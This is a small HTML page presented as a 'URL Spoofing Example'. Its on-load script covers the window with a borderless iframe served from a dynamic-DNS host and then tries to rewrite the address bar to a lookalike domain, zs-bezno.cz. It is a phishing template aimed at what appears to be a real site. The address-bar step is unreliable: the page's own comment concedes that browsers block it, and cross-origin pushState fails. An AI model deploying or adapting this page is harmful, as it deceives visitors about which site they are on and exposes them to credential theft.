<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>URL Spoofing Example</title>
    <script>
        function spoofURL() {
            // Create a new iframe
            var iframe = document.createElement('iframe');
            iframe.style.width = '100%';
            iframe.style.height = '100%';
            iframe.style.border = 'none';
            iframe.src = 'https://zsbezno.servehttp.com/'; // The actual URL the iframe will load

            // Append the iframe to the body
            document.body.appendChild(iframe);

            // Use JavaScript to manipulate the address bar (this is a simplified example)
            // Note: Modern browsers have security measures to prevent this
            history.pushState({}, '', 'https://zs-bezno.cz/'); // The fake URL displayed in the address bar
        }
    </script>
</head>
<body onload="spoofURL()">
    <h1>URL Spoofing Example</h1>
    <p>This page demonstrates URL spoofing in the address bar.</p>
</body>
</html>
